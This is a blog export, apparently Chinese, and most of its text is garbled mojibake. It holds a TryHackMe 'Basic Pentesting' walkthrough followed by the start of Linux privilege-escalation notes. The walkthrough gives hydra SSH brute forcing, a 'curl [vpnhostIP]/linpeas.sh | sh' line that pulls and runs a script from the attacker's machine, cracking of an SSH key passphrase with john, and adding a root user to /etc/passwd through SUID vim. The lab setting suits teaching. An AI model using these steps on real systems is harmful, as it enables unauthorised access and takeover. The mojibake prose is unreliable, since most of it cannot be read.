è®¿é—®è¯¥ç›®å½•ä¼šå‘ç°ä¸¤ä¸ªtxtæ–‡ä»¶ dev.txt: 2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J ä¸»è¦æ˜¯è¯´è¿™é‡Œè®¾ç½®äº†SMBæœåŠ¡ä¸ApacheæœåŠ¡ä»€ä¹ˆçš„. J.txt For J: I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K ä¸»è¦æ˜¯è¯´/etc/shadowä¸­çš„å¯†ç è–„å¼±ï¼Œå­˜åœ¨è¢«çˆ†ç ´çš„é£é™©ï¼Œåˆ°è¿™é‡Œæˆ‘å°±æ²¡ä»€ä¹ˆæ€è·¯äº†ã€‚ä¸çŸ¥é“ä»å“ªé‡Œå…¥æ‰‹å»ç ´è§£å¯†ç  0x04 SMBæœåŠ¡-æš´åŠ›ç ´è§£ enum4linux ip æ¼«é•¿çš„ååˆ†é’Ÿï¼Œæœ€ç»ˆæˆ‘ä»¬çœ‹åˆ°ä¸Šå›¾æ˜¾ç¤ºäº†janä¸kayç”¨æˆ·åï¼Œæ¥ä¸‹æ¥å°è¯•sshå¯†ç çš„çˆ†ç ´ 0x05 SSHå¯†ç çˆ†ç ´ æŒ‰ç†æ¥è¯´è¿™é‡Œåº”è¯¥æ˜¯è¦å¯¹ä¸¤ä¸ªç”¨æˆ·åéƒ½è¿›è¡Œçˆ†ç ´çš„ï¼Œä½†wpä¼¼ä¹éƒ½æ˜¯é©¬åç‚®ï¼Œåªé€‰æ‹©janï¼Œè¿™ä¹Ÿæ„å‘³ç€kayçˆ†ç ´ä¸å‡ºæ¥ã€‚ hydra -l jan -P /usr/share/wordlists/passwords/rockyou.txt 10.10.134.126 ssh æˆåŠŸæ‹¿åˆ°å¯†ç ï¼Œæ¥ä¸‹æ¥è¿›è¡Œsshè¿æ¥ã€‚ 0x06 SSHå¯†é’¥å¯†ç çˆ†ç ´ åœ¨ä¸Šé¢æˆåŠŸè¿æ¥ä¹‹åå‘ç°ä¸æ˜¯rootæƒé™ï¼Œæˆ‘ä»¬å…ˆç”¨è‡ªåŠ¨åŒ–è„šæœ¬æ¥å¯¹æœºå™¨è¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›† wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ä¹‹ååœ¨æ”»å‡»æœºå¼€å¯httpæœåŠ¡ï¼Œåœ¨é¶æœºä¸Šé€šè¿‡wgetæˆ–curlä¸‹è½½è„šæœ¬æ–‡ä»¶ curl [vpnhostIP]/linpeas.sh | sh æ‰«æä¹‹åå¦‚ä¸‹å›¾ï¼Œå‘ç°å­˜åœ¨sshå¯†é’¥ï¼Œæ”»å‡»æ˜¯è¦é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsshçš„è¿æ¥ï¼Œå¯¹åº”çš„ç”¨æˆ·åä¸ºkay è¿›å…¥sshç›®å½•åæˆ‘ä»¬å‘ç°å­˜åœ¨id_rsaç­‰æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æœ¬å¯ä»¥ç›´æ¥å°è¯•åˆ©ç”¨sshç§é’¥è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯å¦‚ä¸‹å›¾ï¼Œè¿˜æ˜¯éœ€è¦å¯†ç ï¼Œé‚£æ¥ä¸‹æ¥å°±åªèƒ½è¿›è¡Œå¯†é’¥å¯†ç çš„çˆ†ç ´äº† ä½†å¹¸è¿çš„æ˜¯æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å¹¶ç”¨ JohnTheRipper ç ´è§£å¯†é’¥ ä½¿ç”¨ ssh2john.py id_rsa &gt; john_id_rsa.hash æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ª john-crackable æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œå¼€å§‹ã€‚ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt john_id_rsa.hash æˆåŠŸæ‹¿åˆ°å¯†ç ï¼Œæ¥ç€è¿›è¡Œsshç™»å½•å³å¯ 0x07 Linuxææƒ â€“æ–¹æ³•äºŒ å›é¡¾ä¹‹å‰çš„Linuxææƒæ–¹æ³•ï¼Œæˆ‘ä»¬åšä¸€äº›å°è¯• è¿™é‡Œå‘ç°suidä¸­å«æœ‰vimï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ ä»¥ rootèº«ä»½è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å†™ï¼Œæ—¢ç„¶å¯ä»¥è¯»å†™ï¼Œæ„å‘³ç€æˆ‘ä»¬æœ‰ä¸¤ä¸ªæ€è·¯ï¼š ä¸€ä¸ªæ˜¯å‘/etc/passwdæ–‡ä»¶åˆ›å»ºrootç”¨æˆ·ï¼Œå¦ä¸€ä¸ªæ˜¯æ”¶é›†passwdä¸shadowæ–‡ä»¶ï¼Œä¹‹åè¿›è¡Œå¯†ç çš„çˆ†ç ´ å¦‚ä¸Šå›¾ï¼Œæµè§ˆä¸€éå‘ç°ä¹‹åä¸¤ä¸ªç”¨æˆ·å«æœ‰å¯†ç ï¼Œä¸”è¿™ä¸¤ä¸ªç”¨æˆ·ä¸æ˜¯rootæƒé™ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½ä½¿ç”¨ä¸Šè¿°çš„ç¬¬ä¸€ç§æ€è·¯äº† æ‰‹åŠ¨æ·»åŠ rootç”¨æˆ· å…ˆé€šè¿‡openssl passwdåˆ›å»ºåŠ ç›hashå¯†ç ï¼š openssl passwd -1 -salt hybcx password æ·»åŠ ç”¨æˆ·åï¼ˆè¯·æ³¨æ„å¦‚ä½•ä½¿ç”¨ root:/bin/bash æ¥æä¾› root shellï¼‰ï¼Œæˆ‘ä»¬å°†éœ€è¦åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·ï¼Œå¹¶å¸Œæœ›æ‹¥æœ‰ root æƒé™ã€‚ æˆåŠŸæ‹¿åˆ°rootæƒé™ 0x08 å‚è€ƒæ–‡ç«  CTF (Basic Pentesting) de TryHackMe Basic Pentesting TryHackMe - åŸºç¡€æ¸—é€æµ‹è¯• æŒ‘æˆ˜","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Linuxæƒé™æå‡","path":"/2024/02/10/thm-linux-quan-xian-ti-sheng/","content":"0x01 ç®€ä»‹ ä»æœ¬è´¨ä¸Šè®²ï¼Œæƒé™å‡çº§é€šå¸¸æ¶‰åŠä»æƒé™è¾ƒä½çš„å¸æˆ·åˆ°æƒé™è¾ƒé«˜çš„å¸æˆ·ã€‚ä»æŠ€æœ¯ä¸Šè®²ï¼Œå®ƒæ˜¯åˆ©ç”¨æ“ä½œç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ã€è®¾è®¡ç¼ºé™·æˆ–é…ç½®ç›‘ç£æ¥æœªç»æˆæƒåœ°è®¿é—®é€šå¸¸é™åˆ¶ç”¨æˆ·è®¿é—®çš„èµ„æºã€‚ åœ¨æ‰§è¡Œç°å®ä¸–ç•Œçš„æ¸—é€æµ‹è¯•æ—¶ï¼Œå¾ˆå°‘èƒ½å¤Ÿè·å¾—ä¸ºæ‚¨æä¾›ç›´æ¥ç®¡ç†è®¿é—®æƒé™çš„ç«‹è¶³ç‚¹ï¼ˆåˆå§‹è®¿é—®æƒé™ï¼‰ã€‚æƒé™å‡çº§è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå¯ä»¥è®©æ‚¨è·å¾—ç³»ç»Ÿç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ï¼Œä»è€Œå…è®¸æ‚¨æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š Resetting passwords é‡ç½®å¯†ç  Bypassing access controls to compromise protected data ç»•è¿‡è®¿é—®æ§åˆ¶æ¥ç ´åå—ä¿æŠ¤çš„æ•°æ® Editing software configurations ç¼–è¾‘è½¯ä»¶é…ç½® Enabling persistence å¯ç”¨æŒä¹…æ€§ Changing the privilege of existing (or new) users æ›´æ”¹ç°æœ‰ï¼ˆæˆ–æ–°ï¼‰ç”¨æˆ·çš„æƒé™ Execute any administrative command æ‰§è¡Œä»»ä½•ç®¡ç†å‘½ä»¤ 0x02 æšä¸¾ æšä¸¾æ˜¯æ‚¨è®¿é—®ä»»ä½•ç³»ç»Ÿåå¿…é¡»é‡‡å–çš„ç¬¬ä¸€æ­¥ã€‚æ‚¨å¯èƒ½å·²ç»é€šè¿‡åˆ©ç”¨å¯¼è‡´æ ¹çº§è®¿é—®çš„ä¸¥é‡æ¼æ´æ¥è®¿é—®ç³»ç»Ÿï¼Œæˆ–è€…åªæ˜¯æ‰¾åˆ°äº†ä½¿ç”¨ä½ç‰¹æƒå¸æˆ·å‘é€å‘½ä»¤çš„æ–¹æ³•ã€‚ä¸ CTF æœºå™¨ä¸åŒï¼Œæ¸—é€æµ‹è¯•æ´»åŠ¨ä¸ä¼šåœ¨æ‚¨è·å¾—ç‰¹å®šç³»ç»Ÿæˆ–ç”¨æˆ·æƒé™çº§åˆ«çš„è®¿é—®æƒé™åç»“æŸã€‚æ­£å¦‚æ‚¨å°†çœ‹åˆ°çš„ï¼Œæšä¸¾åœ¨æ”»å‡»åé˜¶æ®µä¸æ”»å‡»å‰ä¸€æ ·é‡è¦ã€‚ hostname hostname å‘½ä»¤å°†è¿”å›ç›®æ ‡è®¡ç®—æœºçš„ä¸»æœºåã€‚å°½ç®¡è¯¥å€¼å¾ˆå®¹æ˜“æ›´æ”¹æˆ–å…·æœ‰ç›¸å¯¹æ— æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ Ubuntu-3487340239ï¼‰ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿåœ¨ä¼ä¸šç½‘ç»œä¸­çš„è§’è‰²çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚ç”¨äºç”Ÿäº§ SQL æœåŠ¡å™¨çš„ SQL-PROD-01ï¼‰ ã€‚ uname -a å°†æ‰“å°ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºæˆ‘ä»¬æä¾›æœ‰å…³ç³»ç»Ÿä½¿ç”¨çš„å†…æ ¸çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚è¿™åœ¨æœç´¢ä»»ä½•å¯èƒ½å¯¼è‡´æƒé™å‡çº§çš„æ½œåœ¨å†…æ ¸æ¼æ´æ—¶éå¸¸æœ‰ç”¨ã€‚ /proc/version proc æ–‡ä»¶ç³»ç»Ÿ (procfs) æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿè¿›ç¨‹çš„ä¿¡æ¯ã€‚æ‚¨ä¼šåœ¨è®¸å¤šä¸åŒçš„ Linux ç‰ˆæœ¬ä¸­æ‰¾åˆ° procï¼Œè¿™ä½¿å…¶æˆä¸ºæ‚¨çš„æ­¦å™¨åº“ä¸­å¿…ä¸å¯å°‘çš„å·¥å…·ã€‚ æŸ¥çœ‹ /proc/version å¯èƒ½ä¼šä¸ºæ‚¨æä¾›æœ‰å…³å†…æ ¸ç‰ˆæœ¬çš„ä¿¡æ¯ä»¥åŠå…¶ä»–æ•°æ®ï¼Œä¾‹å¦‚æ˜¯å¦å®‰è£…äº†ç¼–è¯‘å™¨ï¼ˆä¾‹å¦‚ GCCï¼‰ã€‚ /etc/issue è¿˜å¯ä»¥é€šè¿‡æŸ¥çœ‹ /etc/issue æ–‡ä»¶æ¥è¯†åˆ«ç³»ç»Ÿã€‚è¯¥æ–‡ä»¶é€šå¸¸åŒ…å«ä¸€äº›æœ‰å…³æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä½†å¯ä»¥è½»æ¾è‡ªå®šä¹‰æˆ–æ›´æ”¹ã€‚åœ¨è¿™ä¸ªä¸»é¢˜ä¸Šï¼Œä»»ä½•åŒ…å«ç³»ç»Ÿä¿¡æ¯çš„æ–‡ä»¶éƒ½å¯ä»¥å®šåˆ¶æˆ–æ›´æ”¹ã€‚ä¸ºäº†æ›´æ¸…æ¥šåœ°äº†è§£ç³»ç»Ÿï¼Œæœ€å¥½æŸ¥çœ‹æ‰€æœ‰è¿™äº›å†…å®¹ã€‚ ps Command ps å‘½ä»¤æ˜¯æŸ¥çœ‹ Linux ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„æœ‰æ•ˆæ–¹æ³•ã€‚åœ¨ç»ˆç«¯ä¸Šè¾“å…¥ ps å°†æ˜¾ç¤ºå½“å‰ shell çš„è¿›ç¨‹ã€‚ ps ï¼ˆè¿›ç¨‹çŠ¶æ€ï¼‰çš„è¾“å‡ºå°†æ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼› PIDï¼šè¿›ç¨‹IDï¼ˆè¿›ç¨‹å”¯ä¸€ï¼‰ TTYï¼šç”¨æˆ·ä½¿ç”¨çš„ç»ˆç«¯ç±»å‹ æ—¶é—´ï¼šè¿›ç¨‹ä½¿ç”¨çš„ CPU æ—¶é—´é‡ï¼ˆè¿™ä¸æ˜¯è¯¥è¿›ç¨‹è¿è¡Œçš„æ—¶é—´ï¼‰ CMDï¼šæ­£åœ¨è¿è¡Œçš„å‘½ä»¤æˆ–å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸ä¼šæ˜¾ç¤ºä»»ä½•å‘½ä»¤è¡Œå‚æ•°ï¼‰ â€œpsâ€å‘½ä»¤æä¾›äº†ä¸€äº›æœ‰ç”¨çš„é€‰é¡¹ã€‚ ps -A ï¼šæŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ ps axjf ï¼šæŸ¥çœ‹è¿›ç¨‹æ ‘ï¼ˆåœ¨ä¸‹é¢è¿è¡Œ ps axjf ä¹‹å‰æŸ¥çœ‹æ ‘çš„å½¢æˆï¼‰ ps aux ï¼š aux é€‰é¡¹å°†æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ (a)ã€æ˜¾ç¤ºå¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ· (u) ä»¥åŠæ˜¾ç¤ºæœªé™„åŠ åˆ°ç»ˆç«¯çš„è¿›ç¨‹ (x ï¼‰ã€‚æŸ¥çœ‹ps auxå‘½ä»¤çš„è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½åœ°äº†è§£ç³»ç»Ÿå’Œæ½œåœ¨çš„æ¼æ´ã€‚ env env å‘½ä»¤å°†æ˜¾ç¤ºç¯å¢ƒå˜é‡ã€‚ PATH å˜é‡å¯èƒ½å…·æœ‰ç¼–è¯‘å™¨æˆ–è„šæœ¬è¯­è¨€ï¼ˆä¾‹å¦‚ Pythonï¼‰ï¼Œå¯ç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œä»£ç æˆ–ç”¨äºæƒé™å‡çº§ã€‚ sudo -l ç›®æ ‡ç³»ç»Ÿå¯ä»¥é…ç½®ä¸ºå…è®¸ç”¨æˆ·ä»¥ root æƒé™è¿è¡ŒæŸäº›ï¼ˆæˆ–å…¨éƒ¨ï¼‰å‘½ä»¤ã€‚ sudo -l å‘½ä»¤å¯ç”¨äºåˆ—å‡ºç”¨æˆ·å¯ä»¥ä½¿ç”¨ sudo è¿è¡Œçš„æ‰€æœ‰å‘½ä»¤. ls Linux ä¸­å¸¸ç”¨çš„å‘½ä»¤ä¹‹ä¸€å¯èƒ½æ˜¯ ls. åœ¨å¯»æ‰¾æ½œåœ¨çš„æƒé™æå‡å‘é‡æ—¶ï¼Œè¯·è®°ä½å§‹ç»ˆä½¿ç”¨å¸¦æœ‰ -la å‚æ•°çš„ ls å‘½ä»¤ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†å¦‚ä½•ä½¿ç”¨ ls æˆ– ls -l å‘½ä»¤è½»æ¾é”™è¿‡â€œsecret.txtâ€æ–‡ä»¶ã€‚ Id id å‘½ä»¤å°†æä¾›ç”¨æˆ·æƒé™çº§åˆ«å’Œç»„æˆå‘˜èº«ä»½çš„æ€»ä½“æ¦‚è¿°ã€‚ å€¼å¾—è®°ä½çš„æ˜¯ï¼Œ id å‘½ä»¤ä¹Ÿå¯ç”¨äºè·å–å…¶ä»–ç”¨æˆ·çš„ç›¸åŒä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ /etc/passwd è¯»å– /etc/passwd æ–‡ä»¶å¯ä»¥æ˜¯å‘ç°ç³»ç»Ÿä¸Šç”¨æˆ·çš„ç®€å•æ–¹æ³•ã€‚ è™½ç„¶è¾“å‡ºå¯èƒ½å¾ˆé•¿å¹¶ä¸”æœ‰ç‚¹ä»¤äººç”Ÿç•ï¼Œä½†å®ƒå¯ä»¥è½»æ¾åœ°è¢«å‰ªåˆ‡å¹¶è½¬æ¢ä¸ºç”¨äºæš´åŠ›æ”»å‡»çš„æœ‰ç”¨åˆ—è¡¨ã€‚ è¯·è®°ä½ï¼Œè¿™å°†è¿”å›æ‰€æœ‰ç”¨æˆ·ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ä¸æ˜¯å¾ˆæœ‰ç”¨çš„ç³»ç»Ÿæˆ–æœåŠ¡ç”¨æˆ·ã€‚å¦ä¸€ç§æ–¹æ³•å¯èƒ½æ˜¯ grep æŸ¥æ‰¾â€œhomeâ€ï¼Œå› ä¸ºçœŸæ­£çš„ç”¨æˆ·å¾ˆå¯èƒ½å°†å…¶æ–‡ä»¶å¤¹æ”¾åœ¨â€œhomeâ€ç›®å½•ä¸‹ã€‚ history ä½¿ç”¨ history å‘½ä»¤æŸ¥çœ‹æ—©æœŸå‘½ä»¤å¯ä»¥è®©æˆ‘ä»¬äº†è§£ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”ï¼ˆå°½ç®¡å¾ˆå°‘ï¼‰å­˜å‚¨äº†å¯†ç æˆ–ç”¨æˆ·åç­‰ä¿¡æ¯ã€‚ ifconfig ç›®æ ‡ç³»ç»Ÿå¯èƒ½æ˜¯å¦ä¸€ä¸ªç½‘ç»œçš„æ¢çº½ç‚¹ã€‚ ifconfig å‘½ä»¤å°†ä¸ºæˆ‘ä»¬æä¾›æœ‰å…³ç³»ç»Ÿç½‘ç»œæ¥å£çš„ä¿¡æ¯ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿå…·æœ‰ä¸‰ä¸ªæ¥å£ï¼ˆeth0ã€tun0 å’Œ tun1ï¼‰ã€‚æˆ‘ä»¬çš„æ”»å‡»æœºå™¨å¯ä»¥åˆ°è¾¾ eth0 æ¥å£ï¼Œä½†æ— æ³•ç›´æ¥è®¿é—®å…¶ä»–ä¸¤ä¸ªç½‘ç»œã€‚ å¯ä»¥ä½¿ç”¨ ip route å‘½ä»¤æŸ¥çœ‹å­˜åœ¨å“ªäº›ç½‘ç»œè·¯ç”±æ¥ç¡®è®¤è¿™ä¸€ç‚¹ã€‚ netstat å¯¹ç°æœ‰æ¥å£å’Œç½‘ç»œè·¯ç”±è¿›è¡Œåˆæ­¥æ£€æŸ¥åï¼Œå€¼å¾—ç ”ç©¶ç°æœ‰é€šä¿¡ã€‚ netstat å‘½ä»¤å¯ä»¥ä¸å¤šä¸ªä¸åŒçš„é€‰é¡¹ä¸€èµ·ä½¿ç”¨æ¥æ”¶é›†æœ‰å…³ç°æœ‰è¿æ¥çš„ä¿¡æ¯ã€‚ netstat -a ï¼šæ˜¾ç¤ºæ‰€æœ‰ç›‘å¬ç«¯å£å’Œå·²å»ºç«‹çš„è¿æ¥ã€‚ netstat -at æˆ– netstat -au ä¹Ÿå¯ç”¨äºåˆ†åˆ«åˆ—å‡º TCP æˆ– UDP åè®®ã€‚ netstat -l ï¼šåˆ—å‡ºâ€œç›‘å¬â€æ¨¡å¼ä¸‹çš„ç«¯å£ã€‚è¿™äº›ç«¯å£å·²æ‰“å¼€å¹¶å‡†å¤‡å¥½æ¥å—ä¼ å…¥è¿æ¥ã€‚è¿™å¯ä»¥ä¸â€œtâ€é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä»…åˆ—å‡ºä½¿ç”¨ TCP åè®®ä¾¦å¬çš„ç«¯å£ï¼ˆå¦‚ä¸‹ï¼‰ netstat -s ï¼šæŒ‰åè®®åˆ—å‡ºç½‘ç»œä½¿ç”¨ç»Ÿè®¡ä¿¡æ¯ï¼ˆå¦‚ä¸‹ï¼‰ è¿™ä¹Ÿå¯ä»¥ä¸ -t æˆ– -u é€‰é¡¹ä¸€èµ·ä½¿ç”¨ï¼Œä»¥å°†è¾“å‡ºé™åˆ¶ä¸ºç‰¹å®šåè®®ã€‚ netstat -tp ï¼šåˆ—å‡ºè¿æ¥ä»¥åŠæœåŠ¡åç§°å’ŒPIDä¿¡æ¯ã€‚ è¿™ä¹Ÿå¯ä»¥ä¸ -l é€‰é¡¹ä¸€èµ·ä½¿ç”¨æ¥åˆ—å‡ºä¾¦å¬ç«¯å£ï¼ˆå¦‚ä¸‹ï¼‰ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°â€œPID/ç¨‹åºåç§°â€åˆ—ä¸ºç©ºï¼Œå› ä¸ºè¯¥è¿›ç¨‹ç”±å¦ä¸€ä¸ªç”¨æˆ·æ‹¥æœ‰ã€‚ ä¸‹é¢æ˜¯ä½¿ç”¨ root æƒé™è¿è¡Œçš„ç›¸åŒå‘½ä»¤ï¼Œå¹¶å°†æ­¤ä¿¡æ¯æ˜¾ç¤ºä¸º 2641/nc (netcat) netstat -i ï¼šæ˜¾ç¤ºæ¥å£ç»Ÿè®¡ä¿¡æ¯ã€‚æˆ‘ä»¬åœ¨ä¸‹é¢çœ‹åˆ°â€œeth0â€å’Œâ€œtun0â€æ¯”â€œtun1â€æ›´æ´»è·ƒã€‚ æ‚¨å¯èƒ½åœ¨åšå®¢æ–‡ç« ã€æ–‡ç« å’Œè¯¾ç¨‹ä¸­æœ€å¸¸çœ‹åˆ°çš„ netstat ç”¨æ³•æ˜¯ netstat -ano ï¼Œå¯ä»¥ç»†åˆ†å¦‚ä¸‹ï¼› -a ï¼šæ˜¾ç¤ºæ‰€æœ‰å¥—æ¥å­— -n ï¼šä¸è§£æåç§° -o ï¼šæ˜¾ç¤ºè®¡æ—¶å™¨ find åœ¨ç›®æ ‡ç³»ç»Ÿä¸­æœç´¢é‡è¦ä¿¡æ¯å’Œæ½œåœ¨çš„æƒé™å‡çº§å‘é‡å¯èƒ½ä¼šå–å¾—ä¸°ç¡•æˆæœã€‚å†…ç½®çš„â€œæŸ¥æ‰¾â€å‘½ä»¤å¾ˆæœ‰ç”¨ï¼Œå€¼å¾—ä¿ç•™åœ¨æ‚¨çš„æ­¦å™¨åº“ä¸­ã€‚ ä»¥ä¸‹æ˜¯â€œæŸ¥æ‰¾â€å‘½ä»¤çš„ä¸€äº›æœ‰ç”¨ç¤ºä¾‹ã€‚ Find files find . -name flag1.txt ï¼šåœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾åä¸ºâ€œflag1.txtâ€çš„æ–‡ä»¶ find /home -name flag1.txt ï¼šåœ¨/homeç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶åâ€œflag1.txtâ€ find / -type d -name config ï¼šæ‰¾åˆ°â€œ/â€ä¸‹åä¸ºconfigçš„ç›®å½• find / -type f -perm 0777 ï¼šæŸ¥æ‰¾å…·æœ‰777æƒé™çš„æ–‡ä»¶ï¼ˆæ‰€æœ‰ç”¨æˆ·å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼‰ find / -perm a=x ï¼šæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ find /home -user frank ï¼šæŸ¥æ‰¾â€œ/homeâ€ä¸‹ç”¨æˆ·â€œfrankâ€çš„æ‰€æœ‰æ–‡ä»¶ find / -mtime 10 ï¼šæŸ¥æ‰¾æœ€è¿‘10å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ find / -atime 10 ï¼šæŸ¥æ‰¾æœ€è¿‘ 10 å¤©å†…è®¿é—®è¿‡çš„æ–‡ä»¶ find / -cmin -60 ï¼šæŸ¥æ‰¾æœ€è¿‘ä¸€å°æ—¶ï¼ˆ60 åˆ†é’Ÿï¼‰å†…æ›´æ”¹çš„æ–‡ä»¶ find / -amin -60 ï¼šæŸ¥æ‰¾æœ€è¿‘ä¸€å°æ—¶ï¼ˆ60åˆ†é’Ÿï¼‰å†…çš„æ–‡ä»¶è®¿é—®æƒ…å†µ find / -size 50M ï¼šæŸ¥æ‰¾å¤§å°ä¸º 50 MB çš„æ–‡ä»¶ è¯¥å‘½ä»¤è¿˜å¯ä»¥ä¸ï¼ˆ+ï¼‰å’Œï¼ˆ-ï¼‰ç¬¦å·ä¸€èµ·ä½¿ç”¨æ¥æŒ‡å®šå¤§äºæˆ–å°äºç»™å®šå¤§å°çš„æ–‡ä»¶ã€‚ ä¸Šé¢çš„ç¤ºä¾‹è¿”å›å¤§äº 100 MB çš„æ–‡ä»¶ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œâ€œfindâ€å‘½ä»¤å¾€å¾€ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæœ‰æ—¶ä¼šå¯¼è‡´è¾“å‡ºéš¾ä»¥é˜…è¯»ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ˜æ™ºçš„åšæ³•æ˜¯ä½¿ç”¨å¸¦æœ‰â€œ-type f 2&gt;/dev/nullâ€çš„â€œfindâ€å‘½ä»¤å°†é”™è¯¯é‡å®šå‘åˆ°â€œ/dev/nullâ€å¹¶è·å¾—æ›´æ¸…æ™°çš„è¾“å‡ºï¼ˆå¦‚ä¸‹ï¼‰ã€‚ å¯ä»¥å†™å…¥æˆ–æ‰§è¡Œçš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼š find / -writable -type d 2&gt;/dev/null ï¼šæŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ find / -perm -222 -type d 2&gt;/dev/null ï¼šæŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ find / -perm -o w -type d 2&gt;/dev/null ï¼šæŸ¥æ‰¾å…¨å±€å¯å†™æ–‡ä»¶å¤¹ æˆ‘ä»¬çœ‹åˆ°ä¸‰ä¸ªä¸åŒçš„â€œæŸ¥æ‰¾â€å‘½ä»¤å¯èƒ½å¯¼è‡´ç›¸åŒç»“æœçš„åŸå› å¯ä»¥åœ¨æ‰‹å†Œæ–‡æ¡£ä¸­çœ‹åˆ°ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œperm å‚æ•°ä¼šå½±å“â€œæŸ¥æ‰¾â€çš„å·¥ä½œæ–¹å¼ã€‚ find / -perm -o x -type d 2&gt;/dev/null ï¼šæŸ¥æ‰¾å…¨å±€å¯æ‰§è¡Œæ–‡ä»¶å¤¹ æŸ¥æ‰¾å¼€å‘å·¥å…·å’Œæ”¯æŒçš„è¯­è¨€ï¼š find / -name perl* find / -name python* find / -name gcc* æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶æƒé™ï¼š ä¸‹é¢æ˜¯ä¸€ä¸ªç®€çŸ­çš„ç¤ºä¾‹ï¼Œç”¨äºæŸ¥æ‰¾è®¾ç½®äº† SUID ä½çš„æ–‡ä»¶ã€‚ SUID ä½å…è®¸æ–‡ä»¶ä»¥æ‹¥æœ‰è¯¥æ–‡ä»¶çš„å¸æˆ·ï¼ˆè€Œä¸æ˜¯è¿è¡Œè¯¥æ–‡ä»¶çš„å¸æˆ·ï¼‰çš„æƒé™çº§åˆ«è¿è¡Œã€‚è¿™å…è®¸ä¸€ä¸ªæœ‰è¶£çš„æƒé™å‡çº§è·¯å¾„ï¼Œæˆ‘ä»¬å°†åœ¨ä»»åŠ¡ 6 ä¸­çœ‹åˆ°æ›´å¤šç»†èŠ‚ã€‚ä¸‹é¢çš„ç¤ºä¾‹ç”¨äºå®Œæˆâ€œfindâ€å‘½ä»¤çš„ä¸»é¢˜ã€‚ find / -perm -u=s -type f 2&gt;/dev/null ï¼šæŸ¥æ‰¾å¸¦æœ‰SUIDä½çš„æ–‡ä»¶ï¼Œè¿™å…è®¸æˆ‘ä»¬ä»¥æ¯”å½“å‰ç”¨æˆ·æ›´é«˜çš„æƒé™çº§åˆ«è¿è¡Œè¯¥æ–‡ä»¶ã€‚ é€šç”¨ Linux å‘½ä»¤ ç”±äºæˆ‘ä»¬å¤„äº Linux é¢†åŸŸï¼Œç†Ÿæ‚‰ Linux å‘½ä»¤é€šå¸¸ä¼šéå¸¸æœ‰ç”¨ã€‚è¯·èŠ±ä¸€äº›æ—¶é—´ç†Ÿæ‚‰ find ã€ locate ã€ grep ã€ cut ã€ sort ç­‰å‘½ä»¤ï¼Œ ETCã€‚ 0x03 è‡ªåŠ¨æšä¸¾å·¥å…· æœ‰å‡ 